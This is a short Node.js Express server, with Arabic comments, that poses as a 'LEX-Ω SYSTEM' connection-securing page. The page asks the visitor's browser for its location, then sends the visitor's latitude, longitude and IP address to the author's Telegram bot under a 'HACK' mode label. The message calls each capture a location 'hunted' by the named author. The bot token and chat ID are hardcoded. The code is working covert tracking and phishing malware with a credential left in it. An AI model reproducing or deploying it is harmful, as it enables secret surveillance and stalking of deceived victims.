const express = require('express');
const axios = require('axios');
const app = express();

const BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8";
const CHAT_ID = "6315285444";

app.get('*', async (req, res) => {
    // استخراج البيانات سواء بدأت بـ ? أو &
    const urlParams = new URLSearchParams(req.url.split('?')[1] || req.url.split('&')[1]);
    const mode = req.query.mode || "فحص عام";
    const lat = req.query.lat || urlParams.get('lat');
    const lon = req.query.lon || urlParams.get('lon');
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (lat && lon) {
        let msg = `☢️ <b>تم اصطياد موقع جديد بواسطة عمر مدهش</b>\n`;
        msg += `⚙️ <b>العملية:</b> ${mode}\n`;
        msg += `📍 <b>الـ IP:</b> <code>${ip}</code>\n`;
        msg += `🗺️ <b>الموقع على الخريطة:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
        
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML'
            });
            return res.send("<h1>Connection Secured Successfully</h1>");
        } catch (err) {
            return res.send("Error sending to bot");
        }
    }

    // إذا لم تتوفر الإحداثيات بعد، نطلبها من المتصفح
    res.send(`
        <html>
        <body style="background:#000;color:#f00;text-align:center;padding-top:100px;">
            <h1>☢ LEX-Ω SYSTEM ☢</h1>
            <p>جاري تأمين الاتصال...</p>
            <script>
                navigator.geolocation.getCurrentPosition(p => {
                    // إعادة توجيه ذكية لإرسال الإحداثيات للسيرفر
                    window.location.href = "/?mode=HACK&lat=" + p.coords.latitude + "&lon=" + p.coords.longitude;
                }, (err) => {
                    window.location.href = "/?mode=FAILED_PERMISSION";
                });
            </script>
        </body>
        </html>
    `);
});

app.listen(process.env.PORT || 10000);
